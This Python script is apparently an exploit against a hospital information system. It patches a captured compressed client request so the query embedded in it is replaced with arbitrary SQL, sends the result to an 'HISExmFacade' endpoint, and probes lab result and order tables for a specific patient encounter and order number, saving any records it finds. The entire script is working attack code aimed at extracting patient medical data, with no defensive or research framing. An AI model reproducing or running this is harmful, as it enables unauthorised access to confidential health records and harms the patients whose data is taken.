from his_client_final import HISClient
import requests
import zlib
import re

class LabSearcher4(HISClient):
    def execute_sql(self, sql):
        try:
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()
            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            target_len = len(original_sql_bytes)
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            padded_sql = sql.ljust(target_len)
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

searcher = LabSearcher4()

ordseq = 'A75176986OR0041'
encntno = '75176986'

# Parse the binary sample file to extract readable strings
print("1. Parsing binary sample_pat_resulth.txt for readable strings...")
try:
    with open("sample_pat_resulth.txt", "r", encoding="utf-8", errors="replace") as f:
        content = f.read()
    # Extract strings that look like IDs or order numbers (alphanumeric, 6+ chars)
    strings = re.findall(r'[A-Z0-9]{6,}', content)
    unique_strings = list(set(strings))[:50]
    print(f"Found {len(unique_strings)} unique strings:")
    for s in sorted(unique_strings):
        print(f"  {s}")
except Exception as e:
    print(f"[-] Error: {e}")

# 2. Try NEWCONLAB tables
print("\n2. Trying NEWCONLAB tables...")
for table in ['NEWCONLAB.LAB_RESULT', 'NEWCONLAB.LAB_ORDER', 'NEWCONLAB.LAB_REPORT']:
    sql = f"SELECT * FROM {table} WHERE ORDSEQ = '{ordseq}'"
    res = searcher.execute_sql(sql)
    if res and "<NewDataSet>" in res and "<DRMODIFY>" in res:
        print(f"[+] Found in {table}!")
        with open(f"newconlab_{table.replace('.','_')}.txt", "w", encoding="utf-8") as f:
            f.write(res)
        print(res[:600])
    else:
        print(f"[-] Not found in {table}.")

# 3. Try querying CPOE.OR_LAB_ORDER or similar
print("\n3. Trying CPOE lab tables...")
for table in ['CPOE.OR_LAB_ORDER', 'CPOE.OR_LAB_RESULT', 'CPOE.OR_ORDER']:
    sql = f"SELECT * FROM {table} WHERE ORDSEQ = '{ordseq}'"
    res = searcher.execute_sql(sql)
    if res and "<NewDataSet>" in res and "<DRMODIFY>" in res:
        print(f"[+] Found in {table}!")
        with open(f"cpoe_{table.replace('.','_')}.txt", "w", encoding="utf-8") as f:
            f.write(res)
        print(res[:600])
    else:
        print(f"[-] Not found in {table}.")
